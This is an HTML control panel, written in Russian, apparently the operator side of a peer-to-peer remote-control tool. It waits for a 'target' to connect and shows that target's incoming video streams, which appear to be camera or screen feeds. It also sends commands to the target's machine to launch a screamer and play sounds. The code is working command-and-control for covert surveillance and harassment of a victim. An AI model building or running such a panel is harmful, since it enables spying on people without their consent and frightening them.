<!DOCTYPE html>
<html>
<head>
    <title>Админ Панель</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #0f0; font-family: monospace; display: flex; margin: 0; }
        #sidebar { width: 300px; border-right: 1px solid #333; padding: 20px; background: #111; }
        #display { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
        video { width: 100%; border: 2px solid #ff0050; border-radius: 10px; }
        .btn { padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 10px; border: none; border-radius: 5px; }
        .btn-red { background: red; color: white; }
        .btn-blue { background: blue; color: white; }
    </style>
</head>
<body>
    <audio id="login-sound" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>

    <div id="sidebar">
        <h2>CONTROL PANEL</h2>
        <div id="status">ОЖИДАНИЕ...</div>
        <hr color="#333">
        <button class="btn btn-red" onclick="sendCommand('SCREAM')">⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
        <button class="btn btn-blue" onclick="sendSound('https://www.myinstants.com/media/sounds/meme-sound.mp3')">🔊 ИГРАТЬ ЗВУК</button>
    </div>
    <div id="display"></div>

    <script>
        const MY_ID = '09062012';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('login-sound').play();
            document.getElementById('status').innerText = "ЦЕЛЬ В СЕТИ";
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const v = document.createElement('video');
                v.autoplay = true; v.srcObject = stream;
                document.getElementById('display').appendChild(v);
            });
        });

        function sendCommand(type) {
            if(activeConn) activeConn.send({ type: type });
        }

        function sendSound(url) {
            if(activeConn) activeConn.send({ type: 'PLAY_SOUND', url: url });
        }
    </script>
</body>
</html>
